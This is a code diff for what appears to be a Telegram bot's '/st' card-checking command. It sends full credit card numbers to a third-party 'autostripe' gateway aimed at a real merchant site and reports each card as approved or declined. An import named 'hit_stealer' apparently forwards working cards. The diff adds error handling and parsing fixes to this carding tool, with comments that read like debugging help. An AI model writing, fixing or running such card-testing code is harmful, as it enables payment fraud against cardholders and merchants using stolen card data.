@@ -9,23 +9,33 @@ from TOOLS.check_all_func import *
 from TOOLS.getbin import *
 from BOT.tools.hit_stealer import send_hit_if_approved
 
+# PASTE THIS NEW FUNCTION
 async def check_stripe5(fullcc: str, session: httpx.AsyncClient) -> dict:
     url = f"https://stripe-auto-dsam.onrender.com/gateway=autostripe/key=xebec/site=dilaboards.com/cc={fullcc}"
     try:
         resp = await session.get(url)
+        
+        # --- FIX IS HERE ---
+        # Check if the response body is empty before trying to parse it
+        if not resp.text:  # .text checks for an empty string
+            return {"status": "Api Error ⚠️", "response": "API returned an empty response."}
+        # --- END OF FIX ---
+
         if resp.status_code != 200:
             return {"status": "Api Down ⚠️", "response": f"HTTP {resp.status_code}"}
-        result = resp.json()
-        response_data = json.loads(result.get("response", "{}"))
+
+        # Now it's safe to parse the JSON
+        response_data = resp.json()
+        
+        # Get the values directly from the parsed dictionary
         status_resp = response_data.get("status", "").upper()
-        message_resp = response_data.get("message", "")
-        response_code = response_data.get("response", "")
+        message_resp = response_data.get("response", "") # The key is "response", not "message"
 
         # Map specific decline message to CARD_DECLINED
-        if "card was declined" in message_resp.lower() or response_code == "PAYMENT_DECLINED":
+        if "card was declined" in message_resp.lower():
             mapped_response = "CARD_DECLINED"
         else:
-            mapped_response = f"{message_resp} ({response_code})"
+            mapped_response = message_resp
 
         if status_resp == "APPROVED":
             status = "Approved ✅"
@@ -33,8 +43,11 @@ async def check_stripe5(fullcc: str, session: httpx.AsyncClient) -> dict:
             status = "Declined ❌"
         else:
             status = "Error ⚠️"
+
         return {"status": status, "response": mapped_response}
+
     except Exception as e:
+        # This will now catch other potential errors, like the server sending malformed JSON
         return {"status": "Api Error ⚠️", "response": str(e)}
 
 @Client.on_message(filters.command("st", [".", "/"]))
